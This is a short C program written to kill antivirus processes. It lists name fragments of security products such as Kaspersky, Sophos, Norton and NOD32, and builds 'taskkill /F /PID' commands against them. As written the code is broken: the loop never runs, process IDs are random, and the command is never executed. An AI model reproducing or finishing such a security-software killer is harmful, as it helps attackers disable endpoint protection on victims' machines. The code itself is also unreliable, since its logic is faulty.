#include "stdio.h"
#include "stdlib.h"

const char *Taskkill[] = {"av","Av","AV","defend","Defend","DEFEND",
							"f-","F-","defense","Defense","DEFENSE",
							"Kaspersky","KASPERSKY","kaspersky",
							"sophos","SOPHOS","Sophos","SAVAdminService.exe", "SavService.exe",
							"Scanner","SCANNER","scanner","Norton","norton","NORTON",
							"Security","SECURITY","security","Anti","ANTI","anti",
							"SCAN","Scan","scan","Malware","MALWARE","malware",
							"Virus","VIRUS","virus","NOD32","nod32","Nod32",
							"Zoner","ZONER","zoner","SECUR","Secur","secur","Dr.","DR.",0};

int NeverAntiVirus(void)
{
        int pid =-1;
        int task =10;
	
	int c;
	
		for(c=0;task < 10;c++) { 
			//pid = FindProcessId(Taskkill[c]);
                        pid = rand()%256;
			if(pid != 0) {
				char command[255] = {0};
				sprintf(command, "taskkill /F /PID %d", pid);
			}
		}
	return 0;
}

int main()
{
  NeverAntiVirus();
}
